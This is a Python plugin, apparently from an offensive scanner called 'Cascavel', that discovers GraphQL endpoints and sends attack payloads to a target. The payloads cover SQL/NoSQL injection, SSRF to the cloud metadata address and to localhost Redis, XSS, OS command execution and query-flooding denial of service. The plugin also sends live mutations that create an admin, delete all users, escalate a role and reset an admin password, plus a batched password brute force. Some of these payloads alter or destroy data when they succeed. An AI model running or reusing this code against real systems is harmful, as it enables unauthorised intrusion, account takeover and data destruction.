# plugins/graphql_injection.py — Cascavel 2026 Intelligence
import requests
import json
import time


CT_JSON = "application/json"
GQL_ENDPOINTS = ["/graphql", "/graphiql", "/api/graphql", "/v1/graphql",
                 "/query", "/gql", "/api/v1/graphql"]

# ──────────── INJECTION PAYLOADS (2026 Expanded) ────────────
INJECTION_PAYLOADS = {
    "SQLI_VIA_GQL": {
        "query": '{ user(id: "1\' OR \'1\'=\'1") { id name email } }',
        "severity": "CRITICO",
    },
    "SQLI_UNION": {
        "query": '{ user(id: "1 UNION SELECT 1,2,3--") { id name email } }',
        "severity": "CRITICO",
    },
    "NOSQL_VIA_GQL": {
        "query": '{ user(id: {"$gt": ""}) { id name email } }',
        "severity": "CRITICO",
    },
    "SSRF_VIA_GQL": {
        "query": '{ importUrl(url: "http://169.254.169.254/latest/meta-data/") }',
        "severity": "CRITICO",
    },
    "SSRF_INTERNAL": {
        "query": '{ importUrl(url: "http://localhost:6379/") }',
        "severity": "CRITICO",
    },
    "DIRECTIVE_OVERLOADING": {
        "query": '{ __typename @aa@bb@cc@dd@ee@ff@gg@hh@ii@jj }',
        "severity": "MEDIO",
    },
    "FIELD_DUPLICATION_DOS": {
        "query": '{ ' + ' '.join([f'a{i}: __typename' for i in range(500)]) + ' }',
        "severity": "MEDIO",
    },
    "CIRCULAR_FRAGMENT": {
        "query": '{ ...A } fragment A on Query { ...B } fragment B on Query { ...A }',
        "severity": "MEDIO",
    },
    "XSS_VIA_ERROR": {
        "query": '{ user(id: "<img src=x onerror=alert(1)>") { id } }',
        "severity": "ALTO",
    },
    "OS_COMMAND": {
        "query": '{ exec(cmd: "id") }',
        "severity": "CRITICO",
    },
}

MUTATION_PAYLOADS = {
    "CREATE_ADMIN": {
        "query": 'mutation { createUser(input: {email: "test@test.com", role: "admin"}) { id role } }',
    },
    "DELETE_ALL": {
        "query": 'mutation { deleteAllUsers { count } }',
    },
    "UPDATE_ROLE": {
        "query": 'mutation { updateUser(id: "1", input: {role: "admin", isAdmin: true}) { id role } }',
    },
    "RESET_PASSWORD": {
        "query": 'mutation { resetPassword(email: "admin@target.com") { success } }',
    },
    "EXECUTE_COMMAND": {
        "query": 'mutation { execute(command: "id") { output } }',
    },
}


def _find_gql_endpoint(target):
    """Descobre endpoint GraphQL ativo."""
    for ep in GQL_ENDPOINTS:
        try:
            resp = requests.post(
                f"http://{target}{ep}",
                json={"query": "{ __typename }"},
                headers={"Content-Type": CT_JSON}, timeout=5,
            )
            if resp.status_code == 200 and ("data" in resp.text or "errors" in resp.text):
                return ep
        except Exception:
            continue
    return None


def _test_injections(target, endpoint):
    """Testa injection payloads via GraphQL."""
    vulns = []
    url = f"http://{target}{endpoint}"
    for name, payload_data in INJECTION_PAYLOADS.items():
        try:
            resp = requests.post(
                url, json={"query": payload_data["query"]},
                timeout=8, headers={"Content-Type": CT_JSON},
            )
            body = resp.text.lower()
            if resp.status_code == 200 and "errors" not in body and "data" in body:
                vulns.append({
                    "tipo": f"GRAPHQL_{name}", "endpoint": endpoint,
                    "severidade": payload_data.get("severity", "CRITICO"),
                    "descricao": f"Payload {name} executado com sucesso via GraphQL!",
                    "amostra": resp.text[:200],
                })
            # Check for SQL error reflection
            elif any(e in body for e in ["syntax error", "sql", "mysql", "postgres",
                                          "sqlite", "oracle", "mssql"]):
                vulns.append({
                    "tipo": f"GRAPHQL_ERROR_LEAK_{name}", "endpoint": endpoint,
                    "severidade": "ALTO",
                    "descricao": f"DB error reflected via {name} — SQL injection possível!",
                })
        except Exception:
            continue
    return vulns


def _test_mutations(target, endpoint):
    """Testa mutations perigosas sem autenticação."""
    vulns = []
    url = f"http://{target}{endpoint}"
    for name, payload_data in MUTATION_PAYLOADS.items():
        try:
            resp = requests.post(
                url, json={"query": payload_data["query"]},
                timeout=8, headers={"Content-Type": CT_JSON},
            )
            if resp.status_code == 200 and "data" in resp.text and "null" not in resp.text:
                vulns.append({
                    "tipo": f"GRAPHQL_MUTATION_{name}", "endpoint": endpoint,
                    "severidade": "CRITICO",
                    "descricao": f"Mutation {name} aceita sem auth — data modification!",
                    "amostra": resp.text[:200],
                })
        except Exception:
            continue
    return vulns


def _test_batched_attack(target, endpoint):
    """Testa brute force via batch query (password spray)."""
    url = f"http://{target}{endpoint}"
    batch = []
    for i in range(50):
        batch.append({
            "query": f'mutation {{ login(email: "admin@target.com", password: "pass{i}") {{ token }} }}'
        })
    try:
        resp = requests.post(url, json=batch, timeout=10,
                             headers={"Content-Type": CT_JSON})
        if resp.status_code == 200:
            try:
                results = resp.json()
                if isinstance(results, list) and len(results) >= 50:
                    return {
                        "tipo": "GRAPHQL_BATCH_BRUTEFORCE", "endpoint": endpoint,
                        "severidade": "CRITICO",
                        "descricao": "50 login mutations aceitas em batch — brute force via GraphQL!",
                    }
            except Exception:
                pass
    except Exception:
        pass
    return None


def run(target, ip, open_ports, banners):
    """
    Scanner GraphQL Injection 2026-Grade — SQLi, NoSQLi, SSRF, XSS, DoS.

    Técnicas: 10 injection payloads (SQLi UNION/NoSQLi/SSRF internal/XSS/
    OS command/directive overloading/field duplication DoS/circular fragment),
    5 dangerous mutations (createAdmin/deleteAll/updateRole/resetPassword/exec),
    batched brute force (50 login mutations), DB error reflection detection,
    multi-endpoint discovery.
    """
    _ = (ip, open_ports, banners)
    vulns = []

    endpoint = _find_gql_endpoint(target)
    if not endpoint:
        return {
            "plugin": "graphql_injection", "versao": "2026.1",
            "resultados": "Nenhum endpoint GraphQL encontrado",
        }

    vulns.extend(_test_injections(target, endpoint))
    vulns.extend(_test_mutations(target, endpoint))

    batch = _test_batched_attack(target, endpoint)
    if batch:
        vulns.append(batch)

    return {
        "plugin": "graphql_injection",
        "versao": "2026.1",
        "endpoint": endpoint,
        "tecnicas": ["sqli", "nosqli", "ssrf", "xss", "os_command",
                      "dos", "mutation_abuse", "batch_bruteforce"],
        "resultados": vulns if vulns else "Nenhuma injection GraphQL detectada",
    }
